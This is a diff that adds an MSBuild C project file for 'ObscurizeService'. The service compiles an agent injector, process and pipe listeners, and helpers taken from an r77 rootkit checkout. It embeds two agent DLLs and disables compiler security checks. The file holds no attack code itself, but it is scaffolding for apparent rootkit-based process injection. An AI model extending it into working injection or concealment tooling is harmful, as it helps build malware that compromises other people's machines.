@@ -1,0 +1,100 @@
+<?xml version="1.0" encoding="utf-8"?>
+<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup Label="ProjectConfigurations">
+    <ProjectConfiguration Include="Release|x64">
+      <Configuration>Release</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+  </ItemGroup>
+  <PropertyGroup Label="Globals">
+    <VCProjectVersion>16.0</VCProjectVersion>
+    <Keyword>Win32Proj</Keyword>
+    <ProjectGuid>{A1B2C3D4-E5F6-7890-ABCD-EF1234567803}</ProjectGuid>
+    <RootNamespace>ObscurizeService</RootNamespace>
+    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v145</PlatformToolset>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
+  <ImportGroup Label="ExtensionSettings" />
+  <ImportGroup Label="Shared" />
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props"
+            Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')"
+            Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <PropertyGroup Label="UserMacros" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <LinkIncremental>false</LinkIncremental>
+    <GenerateManifest>false</GenerateManifest>
+    <OutDir>$(SolutionDir)output\</OutDir>
+    <TargetName>ObscurizeService</TargetName>
+  </PropertyGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <SDLCheck>false</SDLCheck>
+      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
+      <BufferSecurityCheck>false</BufferSecurityCheck>
+      <Optimization>MinSpace</Optimization>
+      <FavorSizeOrSpeed>Size</FavorSizeOrSpeed>
+      <CompileAs>CompileAsC</CompileAs>
+      <AdditionalIncludeDirectories>
+        $(SolutionDir)ObscurizeShared;
+        $(SolutionDir)r77-rootkit\r77-rootkit-master\r77api;
+        %(AdditionalIncludeDirectories)
+      </AdditionalIncludeDirectories>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+      <GenerateDebugInformation>false</GenerateDebugInformation>
+      <AdditionalDependencies>ntdll.lib;advapi32.lib;shlwapi.lib;psapi.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <ImageHasSafeExceptionHandlers>false</ImageHasSafeExceptionHandlers>
+    </Link>
+    <PostBuildEvent>
+      <!-- No post-build needed; RC embeds DLLs from output\ at compile time. -->
+      <Command>echo ObscurizeService built: $(TargetPath)</Command>
+    </PostBuildEvent>
+  </ItemDefinitionGroup>
+  <ItemGroup>
+    <ClCompile Include="ServiceMain.c" />
+    <ClCompile Include="AgentInjector.c" />
+    <ClCompile Include="ProcessListener.c" />
+    <ClCompile Include="ControlPipeListener.c" />
+    <ClCompile Include="ArtefactManager.c" />
+    <!-- r77api sources used by service (injection, process enum, pipe helpers) -->
+    <ClCompile Include="..\r77-rootkit\r77-rootkit-master\r77api\peb.c" />
+    <ClCompile Include="..\r77-rootkit\r77-rootkit-master\r77api\clist.c" />
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="ServiceMain.h" />
+    <ClInclude Include="AgentInjector.h" />
+    <ClInclude Include="ProcessListener.h" />
+    <ClInclude Include="ControlPipeListener.h" />
+    <ClInclude Include="ArtefactManager.h" />
+    <ClInclude Include="..\ObscurizeShared\ObscurizeDef.h" />
+    <ClInclude Include="..\r77-rootkit\r77-rootkit-master\r77api\ntdll.h" />
+    <ClInclude Include="..\r77-rootkit\r77-rootkit-master\r77api\r77mindef.h" />
+    <ClInclude Include="..\r77-rootkit\r77-rootkit-master\r77api\r77win.h" />
+    <ClInclude Include="..\r77-rootkit\r77-rootkit-master\r77api\r77header.h" />
+  </ItemGroup>
+  <ItemGroup>
+    <!-- Resource file embeds the two Agent DLLs as RCDATA (IDs 101 & 102).   -->
+    <!-- Build Agent-x86 and Agent-x64 FIRST so output\ contains both DLLs.   -->
+    <ResourceCompile Include="ObscurizeService.rc" />
+  </ItemGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
+  <ImportGroup Label="ExtensionTargets" />
+</Project>
